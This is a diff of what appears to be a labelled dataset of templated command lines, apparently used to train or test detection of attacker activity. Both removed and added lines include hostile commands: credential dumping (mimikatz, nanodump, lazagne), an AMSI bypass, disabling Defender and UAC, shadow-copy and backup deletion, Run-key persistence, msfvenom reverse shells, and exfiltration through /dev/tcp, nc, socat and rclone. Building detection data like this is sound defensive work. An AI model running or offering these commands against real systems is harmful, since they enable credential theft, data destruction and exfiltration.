@@ -25,38 +25,30 @@
 1	psexec \\${ip_address} -u ${username} -p ${password} script.txt
 1	plink -ssh ${ip_address} -l ${username} -pw ${password}
 1	plink ${username}@${ip_address}
-1	putty -ssh ${ip_address} -l ${username} -pw ${password}
-1	putty -ssh ${username}@${ip_address} -pw ${password}
-1	putty -ssh ${ip_address} -l ${username} -pw ${password} -m script.txt
-1	putty -ssh ${username}@${ip_address} -pw ${password} -m script.txt
-0	cmd.exe /c "net use \\${computer_name}\${destination_file_path} ${password} /u:${username}"
-0	7z a ${destination_file_path} ${source_file_path} -p${password}
-0	sekurlsa::logonpasswords ful
-0	certreq.exe -Post -config ${destination_file_path} c:\windows\win.ini ${source_file_path}
-0	xcopy ${source_directory} ${destination_directory} /s /e
-0	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ${value_name} /t REG_DWORD /f /d ${value}
-0	rsync -r ${username}@${ip_address}:${source_directory} ${destination_directory}
-0	net user /domain
-0	[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-0	cp ${source_file_path} ${destination_file_path}
-0	powershell -c "${command_to_execute}"
-0	sc.exe start ${service_name}
-0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ${value_name} /t REG_DWORD /d ${value}
-0	cmd.exe /c "copy ${source_file_path} ${destination_file_path}"
-0	red add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
-0	vssadmin.exe delete shadows /all /quiet
-0	powershell -c "xcopy ${source_directory} \\${ip_address}\${destination_directory} /s /e"
-0	powershell -c "wbadmin delete systemstatebackup -keepVersions:0"
-0	Invoke-RestMethod -Uri ${ip_address}:${port} -Method Post -InFile ${source_file_path} -ContentType "multipart/form-data"
+0	echo y | plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+0	plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+0	powershell -c "vssadmin.exe delete shadows /all /quiet"
+0	scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+0	msfvenom -p cmd/unix/reverse_bash HOST=${ip_address} LPORT=${port} -f raw -o reverse.sh
+0	scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}
+0	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f jsp -o reverse.jsp
+0	powershell -c "cipher.exe /w:C:"
+0	nanodump.x64.exe -w lsassdump.dmp
+0	SharpRDP.exe computername=${ip_address} command=${command_to_execute} username=${domain}\${username} password=${password}
+0	Compress-Archive -Path ${source_file_path} -DestinationPath ${destination_file_path} -Force
 0	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v ${value_name} /t REG_DWORD /d ${value}
-0	lazagne.exe windows -mscache
-0	cat ${source_file_path} > /dev/tcp/${ip_address}/${port}
-0	cmd.exe /c "${command_to_execute}"
-0	cmd.exe /c "choco install 7zip"
-0	qwinsta.exe /SERVER:${computer_name}
-0	lockbit.exe -pass ${password}
-0	gpg.exe -c ${source_file_path}
-0	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v ${value_name} /t REG_DWORD /d ${value}
-0	Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
-0	cmd.exe /c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
-0	CertReq -Post -config ${destination_file_path} ${source_file_path}
+0	wmic /node:"${ip_address}" process call create "cmd.exe /c esentutl.exe /y /vss ${source_file_path} /d ${destination_file_path}"
+0	Copy-Item "${local_file_path}" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+0	reg SAVE HKLM\SYSTYEM ${local_file_path}
+0	rclone.exe copy C:\Users\Public\collect.7z ${account}:backup
+0	choco install putty
+0	cmd.exe /c "taskkill.exe /f /im ${process_name}"
+0	nc -vn ${ip_address} ${port} < ${source_file_path}
+0	zip -er archive.zip ${source_directory}
+0	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+0	scp ${username}@${ip_address}:${source_file_path} ${destination_file_path}
+0	cat ${source_file_path} | socat - TCP:${ip_address}:${port}
+0	scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+0	powershell -c "vssadmin create shadow /for=C:"
+0	powershell -c "wmic shadowcopy call create Volume=C:"
+0	PsExec64.exe \\${ip_address} -s ${command_to_execute}
